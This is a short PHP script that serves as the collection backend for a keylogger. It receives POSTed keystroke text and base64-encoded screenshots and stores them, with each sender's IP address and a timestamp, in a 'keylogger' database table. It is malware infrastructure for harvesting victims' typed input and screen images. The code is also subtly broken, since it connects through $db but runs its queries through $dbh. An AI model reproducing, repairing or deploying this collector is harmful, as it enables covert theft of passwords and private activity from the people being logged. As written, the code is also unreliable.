<?php
$user = "test"; // DB username
$pass = "test"; // DB password
$dat = date("Y:m:d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

try {
	$db = new PDO('mysql:host=localhost;dbname=test', $user, $pass); // DB Connection
	if(isset($_POST["text"]))
	{
		$input = $_POST["text"];
		// Send information
		$stmt = $dbh->prepare("INSERT INTO keylogger (ip, dat, record) VALUES (:ip, :dat, :record)");
		$stmt->bindParam(':ip', $ip);
		$stmt->bindParam(':dat', $dat);
		$stmt->bindParam(':record', $input);
		$stmt->execute();
		//file_put_contents("data.txt", $input, FILE_APPEND);
	}

	if(isset($_POST["image"]))
	{
		$input = $_POST["image"];
		//$file = fopen(time()."_image.png", 'wb');
		
		$blobImage = base64_decode($input);
		
		$stmt = $dbh->prepare("INSERT INTO keylogger (ip, dat, screenshot) VALUES (:ip, :dat, :screenshot)");
		$stmt->bindParam(':ip', $ip);
		$stmt->bindParam(':dat', $dat);
		$stmt->bindParam(':screenshot', $blobImage);
		$stmt->execute();
	    	//fwrite($file, $input);
	    	//fclose($file);
	}
} catch (PDOException $e) {
    	print "Error!: " . $e->getMessage() . "<br/>";
    	die();
}
?>
